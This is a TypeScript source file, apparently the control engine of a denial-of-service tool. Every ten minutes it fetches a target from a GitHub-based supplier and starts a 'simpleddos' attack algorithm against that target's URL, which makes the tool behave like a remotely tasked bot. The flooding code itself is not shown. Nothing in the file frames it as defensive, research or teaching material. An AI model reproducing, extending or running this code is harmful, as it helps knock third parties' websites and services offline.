import TargetSupplier from './targetSupplier/supplier'
import GithubTargetSupplier from './targetSupplier/github'

import { Algorithm } from './algorithms/algorithm'
import SimpleAlgorithm from './algorithms/simpleddos'

export class Engine {
  private supplier: TargetSupplier
  private algorithm: Algorithm | null

  constructor () {
    this.supplier = new GithubTargetSupplier()
    this.algorithm = null
  }

  start () {
    setInterval(this.worker.bind(this), 600000)
  }

  worker () {
    this.supplier.findNext().then((targetInfo) => {
      if (this.algorithm == null) {
        this.algorithm = new SimpleAlgorithm(targetInfo.url)
        void this.algorithm.start()
      } else {

      }
    }).catch(console.log)
  }
}
